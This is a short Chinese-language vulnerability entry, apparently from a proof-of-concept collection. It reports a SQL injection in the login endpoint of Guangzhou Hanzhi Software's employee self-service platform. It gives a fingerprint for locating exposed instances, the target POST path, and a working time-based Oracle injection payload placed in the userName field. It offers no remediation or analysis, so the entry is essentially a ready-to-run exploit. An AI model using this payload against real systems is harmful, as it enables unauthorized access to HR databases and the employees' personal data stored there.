# 广州翰智软件有限公司员工自助平台存在SQL注入漏洞

广州翰智软件有限公司员工自助平台 ｜ SQL注入 ｜ —
- **指纹**：`"./static/hrfonts/iconfont.css"`
- **请求**：`POST /hrssc/portal/plantform/loginByPassword HTTP/1.1`

**Payload**
```
{"userName":"admin' AND 8383=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)CHR(98)CHR(97)CHR(122),3)-- eWnt","password":"admin"}
---
```